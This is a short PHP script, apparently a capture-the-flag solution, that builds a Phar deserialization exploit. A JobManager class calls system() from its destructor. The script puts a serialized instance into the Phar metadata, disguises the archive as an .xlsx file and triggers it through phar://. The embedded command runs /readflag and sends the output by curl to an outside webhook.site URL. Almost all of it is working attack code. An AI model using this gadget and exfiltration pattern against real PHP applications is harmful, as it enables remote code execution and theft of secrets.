<?php
function startsWith($haystack, $needle) {
    return $needle === "" || strrpos($haystack, $needle, -strlen($haystack)) !== false;
}
class JobManager{
    public $callback = null;
    public $allowCallbackList = ["system"];
    public $arg = [];
    private $jobs = [];
    public function __construct($job, $callback, $arg) {
        $this->add_Job($job);
        $this->callback = $callback;
        $this->arg = $arg;
    }

    public function add_Job($job) {
        if(is_string($job) && !empty($job)) {
            $this->jobs[] = $job;
        } else {
            throw new InvalidArgumentException("Invalid job provided");
        }
    }

    public function flush() {
        $this->callback = null;
        $this->arg = null;
    }

    public function __destruct() {
        foreach ($this->allowCallbackList as $ck) {
            if(startsWith($this->callback, $ck)) {
                call_user_func_array($this->callback, $this->arg);
            }
        }
    }
}

$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$object = new JobManager('1234', 'system', ['curl -X POST -d "$(/readflag)" https://webhook.site/5fd286af-764f-487b-b21c-9f8421a10eb9']);
$phar->setMetadata($object);
$phar->stopBuffering();
system("mv payload.phar payload.xlsx");
readfile("phar://payload.xlsx");
# php --define phar.readonly=0 payload.php
?>